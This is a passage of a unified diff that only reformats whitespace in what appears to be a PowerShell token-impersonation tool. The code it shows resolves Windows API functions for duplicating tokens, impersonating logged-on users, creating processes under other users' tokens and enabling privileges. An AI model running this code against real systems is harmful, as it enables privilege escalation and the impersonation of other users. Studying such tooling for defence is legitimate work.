     $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
-	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    
+    $GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    
 
     $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
-	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
-	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    
+    $SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
+    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    
 
     $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
-	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
-	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)
+    $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+    $ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)
 
     $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
-	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
-	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
+    $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
+    $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
 
     $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
-	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
-	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)
+    $LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
+    $LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)
 
     $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
-	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
-	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
+    $CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
+    $CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
 
     $memsetAddr = Get-ProcAddress msvcrt.dll memset
-	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
-	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
+    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
 
     $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
-	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
+    $DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
+    $DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
 
     $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
-	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
-	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
+    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
+    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
 
     $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
-	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
-	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
+    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
 
     $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
-	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
-	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)
+    $LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
+    $LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)
 
     $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
-	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
+    $OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+    $OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
 
     $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
-	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
-	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
+    $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+    $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
 
     $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
-	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
-	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)
+    $CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
+    $CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)
 
     $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
     $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
@@ -23916,98 +23920,98 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
     #Used to add 64bit memory addresses
     Function Add-SignedIntAsUnsigned
-	{
-		Param(
-		[Parameter(Position = 0, Mandatory = $true)]
-		[Int64]
-		$Value1,
-		
-		[Parameter(Position = 1, Mandatory = $true)]
-		[Int64]
-		$Value2
-		)
-		
-		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
-		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
-		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+    {
+        Param(
+        [Parameter(Position = 0, Mandatory = $true)]
+        [Int64]
+        $Value1,
+        
+        [Parameter(Position = 1, Mandatory = $true)]
+        [Int64]
+        $Value2
+        )
+        
+        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
+        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
 
-		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
-		{
-			$CarryOver = 0
-			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
-			{
-				#Add bytes
-				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
+        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
+        {
+            $CarryOver = 0
+            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
+            {
+                #Add bytes
+                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
 
-				$FinalBytes[$i] = $Sum -band 0x00FF
-				
-				if (($Sum -band 0xFF00) -eq 0x100)
-				{
-					$CarryOver = 1
-				}
-				else
-				{
-					$CarryOver = 0
-				}
-			}
-		}
-		else
-		{
-			Throw "Cannot add bytearrays of different sizes"
-		}
-		
-		return [BitConverter]::ToInt64($FinalBytes, 0)
-	}
+                $FinalBytes[$i] = $Sum -band 0x00FF
+                
+                if (($Sum -band 0xFF00) -eq 0x100)
+                {
+                    $CarryOver = 1
+                }
+                else
+                {
+                    $CarryOver = 0
+                }
+            }
+        }
+        else
+        {
+            Throw "Cannot add bytearrays of different sizes"
+        }
+        
+        return [BitConverter]::ToInt64($FinalBytes, 0)
+    }
 
 
     #Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL
     function Enable-SeAssignPrimaryTokenPrivilege
-    {	
-	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
-	    if ($ThreadHandle -eq [IntPtr]::Zero)
-	    {
-		    Throw "Unable to get the handle to the current thread"
-	    }
-		
-	    [IntPtr]$ThreadToken = [IntPtr]::Zero
-	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+    {   
+        [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
+        if ($ThreadHandle -eq [IntPtr]::Zero)
+        {
+            Throw "Unable to get the handle to the current thread"
+        }
+        
+        [IntPtr]$ThreadToken = [IntPtr]::Zero
+        [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
         $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
-	    if ($Result -eq $false)
-	    {
-		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
-		    {
-			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
-			    if ($Result -eq $false)
-			    {
-				    Throw (New-Object ComponentModel.Win32Exception)
-			    }
-				
-			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
-			    if ($Result -eq $false)
-			    {
-				    Throw (New-Object ComponentModel.Win32Exception)
-			    }
-		    }
-		    else
-		    {
-			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
-		    }
-	    }
+        if ($Result -eq $false)
+        {
+            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
+            {
+                $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
+                if ($Result -eq $false)
+                {
+                    Throw (New-Object ComponentModel.Win32Exception)
+                }
+                
+                $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+                if ($Result -eq $false)
+                {
+                    Throw (New-Object ComponentModel.Win32Exception)
+                }
+            }
+            else
+            {
+                Throw ([ComponentModel.Win32Exception] $ErrorCode)
+            }
+        }
 
         $CloseHandle.Invoke($ThreadHandle) | Out-Null
-	
+    
         $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
         $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
         $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
         [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
 
-	    $Result = $LookupPrivilegeValue.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $LuidObject)
+        $Result = $LookupPrivilegeValue.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $LuidObject)
 
-	    if ($Result -eq $false)
-	    {
-		    Throw (New-Object ComponentModel.Win32Exception)
-	    }
+        if ($Result -eq $false)
+        {
+            Throw (New-Object ComponentModel.Win32Exception)
+        }
 
         [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
         $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
@@ -24021,16 +24025,16 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
         $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
         [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
-	    $TokenPrivileges.PrivilegeCount = 1
-	    $TokenPrivileges.Privileges = $LuidAndAttributes
+        $TokenPrivileges.PrivilegeCount = 1
+        $TokenPrivileges.Privileges = $LuidAndAttributes
 
         $Global:TokenPriv = $TokenPrivileges
 
-	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-	    if ($Result -eq $false)
-	    {
+        $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+        if ($Result -eq $false)
+        {
             Throw (New-Object ComponentModel.Win32Exception)
-	    }
+        }
 
         $CloseHandle.Invoke($ThreadToken) | Out-Null
     }
@@ -24053,51 +24057,51 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             $Privilege
         )
 
-	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
-	    if ($ThreadHandle -eq [IntPtr]::Zero)
-	    {
-		    Throw "Unable to get the handle to the current thread"
-	    }
-		
-	    [IntPtr]$ThreadToken = [IntPtr]::Zero
-	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+        [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
+        if ($ThreadHandle -eq [IntPtr]::Zero)
+        {
+            Throw "Unable to get the handle to the current thread"
+        }
+        
+        [IntPtr]$ThreadToken = [IntPtr]::Zero
+        [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
         $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
-	    if ($Result -eq $false)
-	    {
-		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
-		    {
-			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
-			    if ($Result -eq $false)
-			    {
-				    Throw (New-Object ComponentModel.Win32Exception)
-			    }
-				
-			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
-			    if ($Result -eq $false)
-			    {
-				    Throw (New-Object ComponentModel.Win32Exception)
-			    }
-		    }
-		    else
-		    {
-			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
-		    }
-	    }
+        if ($Result -eq $false)
+        {
+            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
+            {
+                $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
+                if ($Result -eq $false)
+                {
+                    Throw (New-Object ComponentModel.Win32Exception)
+                }
+                
+                $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+                if ($Result -eq $false)
+                {
+                    Throw (New-Object ComponentModel.Win32Exception)
+                }
+            }
+            else
+            {
+                Throw ([ComponentModel.Win32Exception] $ErrorCode)
+            }
+        }
 
         $CloseHandle.Invoke($ThreadHandle) | Out-Null
-	
+    
         $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
         $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
         $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
         [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
 
-	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)
+        $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)
 
-	    if ($Result -eq $false)
-	    {
-		    Throw (New-Object ComponentModel.Win32Exception)
-	    }
+        if ($Result -eq $false)
+        {
+            Throw (New-Object ComponentModel.Win32Exception)
+        }
 
         [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
         $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
@@ -24111,17 +24115,17 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
         $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
         [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
-	    $TokenPrivileges.PrivilegeCount = 1
-	    $TokenPrivileges.Privileges = $LuidAndAttributes
+        $TokenPrivileges.PrivilegeCount = 1
+        $TokenPrivileges.Privileges = $LuidAndAttributes
 
         $Global:TokenPriv = $TokenPrivileges
 
         Write-Verbose "Attempting to enable privilege: $Privilege"
-	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-	    if ($Result -eq $false)
-	    {
+        $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+        if ($Result -eq $false)
+        {
             Throw (New-Object ComponentModel.Win32Exception)
-	    }
+        }
 
         $CloseHandle.Invoke($ThreadToken) | Out-Null
         Write-Verbose "Enabled privilege: $Privilege"
@@ -24834,17 +24838,17 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                 $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
 
-		#Pass created System.Diagnostics.Process object to pipeline
-		if ($PassThru) {
-			#Retrieving created System.Diagnostics.Process object
-			$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId
+        #Pass created System.Diagnostics.Process object to pipeline
+        if ($PassThru) {
+            #Retrieving created System.Diagnostics.Process object
+            $returnProcess = Get-Process -Id $ProcessInfo.dwProcessId
 
-			#Caching process handle so we don't lose it when the process exits
-			$null = $returnProcess.Handle
+            #Caching process handle so we don't lose it when the process exits
+            $null = $returnProcess.Handle
 
-			#Passing System.Diagnostics.Process object to pipeline
-			$returnProcess
-		}
+            #Passing System.Diagnostics.Process object to pipeline
+            $returnProcess
+        }
             }
             else
             {
